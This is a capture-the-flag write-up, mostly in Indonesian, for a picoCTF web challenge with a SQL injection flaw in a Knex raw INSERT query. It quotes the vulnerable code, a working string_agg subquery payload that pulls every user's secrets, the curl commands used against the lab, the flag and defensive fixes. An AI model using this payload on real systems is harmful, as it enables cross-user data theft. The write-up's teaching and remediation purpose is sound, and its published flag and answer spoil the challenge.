# Writeup: Secret Box (Challenge ID: 747)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation / SQL Injection via Template Literal Interpolation & Subquery Exfiltration (NIST SP 800-115 §4.3)
- **Difficulty:** Medium (2)
- **Points:** 200
- **Author:** LT 'syreal' Jones
- **Event:** picoCTF 2026
- **Flag (Resmi CyLab):** `academy{sq1_1nject10n_4cc7170a}`
- **Flag Komunitas:** `CTF{sq1_1nject10n_4cc7170a}`

---

## Problem Statement & Scope

Tantangan menguji keterampilan audit keamanan kode sumber (*White-box Code Auditing*) dan eksploitasi celah injeksi basis data (*SQL Injection*) pada aplikasi berbasis arsitektur modern (Node.js/Express + PostgreSQL):
> *"We've built a secure secrets vault for storing private user notes. Only you can view your own secrets. Can you break into the vault and recover the administrator's confidential flag?"*

Laboratorium menyediakan arsip kode sumber `source.tar.gz` yang memuat logika backend aplikasi (`server.js`, `package.json`). Aplikasi menyediakan antarmuka otentikasi:
- `POST /signup`: Pendaftaran akun baru dengan `username` dan `password`.
- `POST /login`: Autentikasi pengguna, menerbitkan cookie sesi `auth_token`.
- `GET /`: Dashboard yang menampilkan daftar rahasia (*secrets*) yang dimiliki oleh pengguna yang sedang login.
- `POST /secrets/create`: Pembuatan catatan rahasia baru dengan parameter `content`.

Pada saat inisialisasi basis data kontainer, akun administrator dibuat dan diisi catatan rahasia yang bersumber dari variabel lingkungan:
`FLAG = process.env.FLAG || 'academy{...}'`.

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **SQL Injection via String Interpolation (CWE-89 / OWASP A03:2021 - Injection):**
   - Meskipun sebagian besar endpoint aplikasi telah menggunakan query builder Knex.js dengan parameter binding yang aman (`?`), endpoint `/secrets/create` menggunakan interpolasi string mentah (*ES6 Template Literals*) ke dalam pemanggilan `knex.raw()`:
     ```javascript
     app.post('/secrets/create', isAuthenticated, async (req, res) => {
         const { content } = req.body;
         const userId = req.user.id;
         // Rentan terhadap CWE-89: Interpolasi string langsung tanpa sanitasi/parameterisasi
         await knex.raw(`INSERT INTO secrets(owner_id, content) VALUES ('${userId}', '${content}')`);
         res.redirect('/');
     });
     ```
   - Input `content` yang dikontrol oleh pengguna dievaluasi langsung oleh parser PostgreSQL sebagai bagian dari struktur sintaks SQL dan bukan sebagai nilai data literal murni.

2. **Cross-Tenant Data Exfiltration via Aggregation Subquery:**
   - Karena perintah SQL yang rentan adalah `INSERT`, penyerang dapat menyisipkan ekspresi subquery menggunakan operator konkatenasi string SQL (`||`):
     ```sql
     ' || (SELECT string_agg(content, '|') FROM secrets) || '
     ```
   - Ketika dieksekusi di server:
     ```sql
     INSERT INTO secrets(owner_id, content) VALUES ('<attacker_uuid>', '' || (SELECT string_agg(content, '|') FROM secrets) || '')
     ```
   - Fungsi PostgreSQL `string_agg(content, '|')` menggabungkan seluruh baris catatan rahasia dari tabel `secrets` lintas seluruh penyewa (*cross-tenant*), termasuk catatan milik administrator.
   - Hasil gabungan string tersebut disimpan sebagai catatan baru milik akun penyerang (`<attacker_uuid>`). Saat penyerang memuat halaman `/`, aplikasi secara sah merender catatan tersebut ke peramban.

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Static Code Review (Source Code Audit):**
   - Mengekstrak berkas `source.tar.gz` dan memeriksa `server.js`:
     ```bash
     tar -xzf source.tar.gz
     grep -n "knex.raw" server.js
     ```
   - Menemukan diskrepansi implementasi: rute login dan registrasi menggunakan bind parameter:
     `knex('users').where({ username }).first()`
     sedangkan rute `/secrets/create` menggunakan interpolasi template literal unescaped:
     `knex.raw(\`INSERT INTO secrets(owner_id, content) VALUES ('\${userId}', '\${content}')\`)`.

2. **Probing Sintaks & Konfirmasi Kerentanan:**
   - Melakukan pendaftaran dan login akun pengujian:
     ```bash
     curl -s -c cookies.txt -d "username=auditor&password=password123" http://chatelaine.cylabacademy.net:PORT/signup
     curl -s -b cookies.txt -c cookies.txt -d "username=auditor&password=password123" http://chatelaine.cylabacademy.net:PORT/login
     ```
   - Mengirimkan karakter uji petik tunggal:
     ```bash
     curl -s -b cookies.txt -d "content=test'probe" http://chatelaine.cylabacademy.net:PORT/secrets/create
     ```
   - Server mengembalikan pesan kesalahan internal HTTP 500 dengan detail sintaks database PostgreSQL (*Database Syntax Error*), mengonfirmasi kegagalan parsing petik tunggal unescaped.

3. **Injeksi Payload Eksfiltrasi Subquery:**
   - Menyusun payload konkatenasi subquery:
     `' || (SELECT string_agg(content, '|') FROM secrets) || '`
   - Mengirimkan payload via permintaan HTTP POST:
     ```bash
     curl -s -b cookies.txt -d "content='||(SELECT string_agg(content,'|') FROM secrets)||'" \
          http://chatelaine.cylabacademy.net:PORT/secrets/create
     ```
   - Server merespons dengan HTTP 302 Redirect ke `/`.

4. **Ekstraksi Flag & Validasi:**
   - Mengakses dashboard pengguna:
     ```bash
     curl -s -b cookies.txt http://chatelaine.cylabacademy.net:PORT/
     ```
   - Halaman HTML merender secret baru milik pengguna yang berisi:
     `academy{sq1_1nject10n_4cc7170a}|testprobe`
   - Token diekstrak menggunakan skrip mandiri `scripts/solve_747_secret_box.py`.

5. **Verifikasi Token REST API:**
   - Mengirimkan token ke endpoint platform CyLab `POST /api/submissions/`.
   - Respons platform menghasilkan status HTTP 201 Created dengan atribut `correct: true`.

---

## Flag & Verifikasi

- **Flag Resmi CyLab:** `academy{sq1_1nject10n_4cc7170a}`
- **Format Komunitas:** `CTF{sq1_1nject10n_4cc7170a}`
- **Bukti Validasi REST API:** HTTP 201 Created via `POST /api/submissions/`:
  ```json
  {"user": 1072359, "challenge": 747, "flag": "academy{sq1_1nject10n_4cc7170a}", "correct": true, "historical": false}
  ```

---

## Takeaway Kompetensi LKS & Mitigasi Defensif (NIST SP 800-115)

1. **Mandatory Parameterized Queries / Prepared Statements (CWE-89 Remediation):**
   - Jangan pernah menyusun pernyataan SQL melalui konkatenasi string atau template literal, termasuk saat memanggil API raw query builder.
   - Gunakan selalu mekanisme positional placeholder (`?`) atau named parameters:
     ```javascript
     // Perbaikan Aman:
     await knex.raw('INSERT INTO secrets(owner_id, content) VALUES (?, ?)', [userId, content]);
     // Atau menggunakan ORM/Query Builder method native:
     await knex('secrets').insert({ owner_id: userId, content: content });
     ```

2. **Prinsip Validasi Masukan & Kepatuhan NIST SP 800-53 SI-10:**
   - Terapkan validasi tipe data, panjang string masukan, dan sanitasi karakter khusus sebelum memproses input pengguna.
   - Nonaktifkan tampilan pesan kesalahan basis data terperinci (*Stack Trace & Database Error Disclosure*) ke lingkungan produksi; gunakan penanganan kesalahan terpusat dengan pesan error generik (mitigasi CWE-209).

3. **Isolasi Akses & Pemisahan Tenant (Defense in Depth):**
   - Terapkan kebijakan Row-Level Security (RLS) di tingkat database PostgreSQL agar pengguna basis data aplikasi hanya dapat membaca baris yang cocok dengan konteks sesi aktif pengguna, sehingga serangan subquery lintas tenant dapat dicegah meskipun terjadi celah injeksi.

---

## Rekap Tim AI (Orkestrasi & Bimbingan LKS)

- **David (Leader):** Memimpin analisis keamanan kode sumber aplikasi dan memastikan validasi pengujian injeksi SQL sesuai NIST SP 800-115 §4.3.
- **Charlie (Trend-hunter):** Mencatat materi SQL Injection subquery exfiltration dan review source code ORM sebagai pilar utama kompetisi LKS Cyber Security Nasional tingkat provinsi maupun nasional.
- **Alex (Fullstack-dev) & Omnirush (Coding Agent):** Mengembangkan simulator database lokal SQLite in-memory untuk mereproduksi perilaku string interpolation subquery dan skrip interaksi remote live.
- **Julius (QA-engineer):** Menjalankan pengujian sintaksis payload PostgreSQL `string_agg` vs SQLite `group_concat` dan memastikan status HTTP 201 pada API CyLab.
- **Athena (Security-engineer):** Merancang arsitektur perbaikan parameterized queries Knex.js dan rekomendasi Row-Level Security (RLS) PostgreSQL sesuai NIST SP 800-53 SI-10.
- **Judith (Guru LKS):** Mengompilasi materi perbedaan coding aman (*Safe vs Unsafe ORM raw patterns*) ke dalam kurikulum modul pelatihan *Web Security Defense* siswa bimbingan LKS.
